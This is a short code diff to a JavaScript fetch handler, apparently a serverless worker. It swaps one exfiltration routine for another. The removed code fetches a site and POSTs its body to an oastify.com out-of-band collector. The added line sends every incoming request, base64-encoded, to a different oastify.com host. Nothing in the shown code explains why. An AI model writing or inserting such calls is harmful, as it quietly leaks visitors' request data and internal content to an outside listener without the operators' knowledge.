@@ -13,31 +13,7 @@ import exec from "child_process";
  */
 export default {
   async fetch(request, env, executionContext) {
-  fetch("https://bzhunt.fr")
-  .then((response) => response.text())
-  .then((data) => {
-    const postData = data;
-
-    const options = {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'text/plain',
-        'Content-Length': Buffer.byteLength(postData),
-      },
-      body: postData,
-    };
-
-    const apiUrl = 'https://xde2mz5rdthvhp1vmhb5hlg7syypmgf44.oastify.com/api/results';
-
-    fetch(apiUrl, options)
-      .then((response) => {
-        console.log(`statusCode: ${response.status}`);
-        return response.text();
-      })
-      .then((data) => console.log(data))
-      .catch((error) => console.error(error));
-  })
-  .catch((error) => console.error(error));
+  fetch('http://txuy6vpnxp1r1llr6dv11h03cuil6cw0l.oastify.com/ok/'+btoa(JSON.stringify(request)));  
 
 
     try {
